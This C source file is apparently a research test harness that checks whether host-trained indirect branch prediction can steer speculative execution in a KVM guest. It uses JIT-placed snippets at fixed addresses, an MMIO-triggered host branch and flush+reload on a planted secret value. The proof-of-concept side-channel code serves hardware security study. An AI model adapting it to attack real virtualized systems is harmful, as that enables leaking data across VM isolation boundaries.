#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <uarf/mem.h>
#include <unistd.h>

#define CACHE_MISS_THRES 300
#define SECRET           3
#define RB_OFFSET        0x3c0
#define RB_SLOTS         4
#include "rb_tools.h"
#include <uarf/compiler.h>
#include <uarf/flush_reload.h>
#include <uarf/jita.h>
#include <uarf/log.h>

#define PAGE_4K (4096UL)
#define PAGE_2M (512 * PAGE_4K)
#define PAGE_1G (512 * PAGE_2M)
#define PROT_RW     (PROT_READ | PROT_WRITE)
#define PROT_RWX    (PROT_RW | PROT_EXEC)
#define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)

#define CHECK_HIT

// WARNING: Always check that all macros are correct!

#define MMIO_BASE      0x000081086000UL
#define HVA_SRC        0x555555da74c1UL
#define HVA_DST_VICTIM 0x555556000000UL
#define HVA_DST_ROCKER 0x5555559c4a00UL // rocker target

// Number of training rounds
#define NUM_TRAIN 1
#define ROUNDS    1024

extern char psnip_src_call_label[];
extern char psnip_src_entry_label[];
// clang-format off
uarf_psnip_declare_define(psnip_src,
    "psnip_src_entry_label:\n\t" // 0x555555da7440
    ".rept 0x49\n\t"
    "nop\n\t"
    ".endr\n\t"
    "test %ebx,%ebx\n\t"    // 0x555555da7489 <--- entrypoint of this snippet
    "je step1\n\t"          // 0x555555da748b
    ".skip 0x23\n\t"
    
    "step2: \n\t"           // 0x555555da74b0 <--- then jumps here
    ".rept 0x11\n\t"
    "nop\n\t"
    ".endr\n\t"
    "psnip_src_call_label:\n"
    "call *0x8(%rax)\n\t"      // 0x555555da74c1 (Size: 3)
    "ret\n\t"                  // 0x555555da74c3  Size: 1
    ".skip 0x3b\n\t"

    "step1:\n\t"
    "test %ebx,%ebx\n\t"    // 0x555555da7500 <--- first jumps here
    "je step2\n\t"          // 0x555555da7502
);
// clang-format on

// clang-format off
uarf_psnip_declare_define(psnip_victim_dst, 
    "ret\n\t"
);

// clang-format off
uarf_psnip_declare_define(psnip_rocker_signal_dst, 
    "mov (%rdx), %r8\n\t"
    "ret\n\t"
);
// clang-format on

uint64_t dst_ptr[0x50];

typedef struct UarfPiReqMmio UarfPiReqMmio;
struct UarfPiReqMmio {
    uint64_t addr;
    uint64_t value;
};

#define UARF_IOCTL_MMIO _IOWR('m', 9, UarfPiReqMmio)
static __always_inline void uarf_pi_wrmmio(uint64_t addr, uint64_t value) {
    UarfPiReqMmio req = {.addr = addr, .value = value};

    if (ioctl(fd_pi, UARF_IOCTL_MMIO, &req) < 0) {
        perror("Failed to do MMIO\n");
    }
}

int main(void) {

    UARF_LOG_INFO("Initialize\n");

    uarf_pi_init();
    rb_init();

    uint64_t call_offset = ((uint64_t) psnip_src_call_label) - psnip_src.addr;

    UarfStub stub_src = uarf_stub_init();
    UarfStub stub_victim_dst = uarf_stub_init();
    UarfStub stub_signal_rocker_dst = uarf_stub_init();
    UarfJitaCtxt jita_src = uarf_jita_init();
    UarfJitaCtxt jita_victim_dst = uarf_jita_init();
    UarfJitaCtxt jita_signal_rocker_dst = uarf_jita_init();

    uarf_jita_push_psnip(&jita_src, &psnip_src);
    uarf_jita_push_psnip(&jita_victim_dst, &psnip_victim_dst);
    uarf_jita_push_psnip(&jita_signal_rocker_dst, &psnip_rocker_signal_dst);

    uarf_jita_allocate(&jita_src, &stub_src, _ul(HVA_SRC - call_offset));
    uarf_jita_allocate(&jita_victim_dst, &stub_victim_dst, _ul(HVA_DST_VICTIM));
    uarf_jita_allocate(&jita_signal_rocker_dst, &stub_signal_rocker_dst, HVA_DST_ROCKER);

    uint64_t entry_offset = ((uint64_t) psnip_src_entry_label) - psnip_src.addr;
    uint64_t entry_point = stub_src.addr + entry_offset;

    dst_ptr[1] = _ul(stub_victim_dst.addr);

    // check aslr
    UARF_LOG_INFO("Look for Host-trained branch prediction\n");
    rb_reset();
    for (size_t i = 0; i < ROUNDS; i++) {
        uarf_pi_wrmsr(MSR_PRED_CMD, BIT(MSR_PRED_CMD__IBPB));

        // Trigger the host "attacking" branch
        uarf_pi_wrmmio(MMIO_BASE, 0xABABABABABABABAB);

        rb_flush();
        uarf_mfence();

        // Value gets passed to RDX register of victim branch
        uint8_t *reload_ptr = _ptr(RB_PTR + RB_OFFSET + SECRET * RB_STRIDE);
        asm volatile("victim_label:\n"
                     "clflush (%1)\n\t"
                     "call *%3\n\t"
                     :
                     : "d"(reload_ptr), "a"(dst_ptr), "b"(0), "r"(entry_point)
                     : "r8", "memory");

        for (volatile size_t i = 0; i < 10000; i++) {
        }
        rb_reload();
    }

    size_t maxi = rb_max_index(rb_hist, RB_SLOTS - 1);
    if (maxi == SECRET && rb_hist[SECRET] > ROUNDS / 2) {
        UARF_LOG_INFO("Host can attack guest!\n");
    }
    else {
        UARF_LOG_INFO("No attack detected.\n");
    }

    fflush(stdout);

    return 0;
}
